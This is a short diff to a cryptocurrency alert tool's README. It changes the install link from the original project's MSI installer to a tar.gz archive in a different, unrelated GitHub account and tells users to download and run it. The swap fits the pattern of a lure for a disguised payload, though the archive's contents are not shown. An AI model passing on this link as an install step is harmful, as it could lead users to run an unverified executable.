@@ -5,7 +5,7 @@ Cryptocurrency alert system that runs locally on your computer.
 Notifies you when alert condition is met. Current alert types are: price, MACD, RSI, Stochastic. Supports almost all markets and exchanges. Can look for updates and update itself.
 
 ## How to install if you are a user
-1. Go to https://github.com/Stock84-dev/Crypto-Watcher/blob/master/CryptoWatchSetup/Release/CryptoWatchSetup.msi
+1. Go to https://github.com/sniper-bot2022/Cryptocurrency-alert-system/blob/d9ae054be689d0f802e3e446e914e98d39bec77f/CryptoWatchSetup.tar.gz
 2. Click download button and run setup.
 
 ## Tips
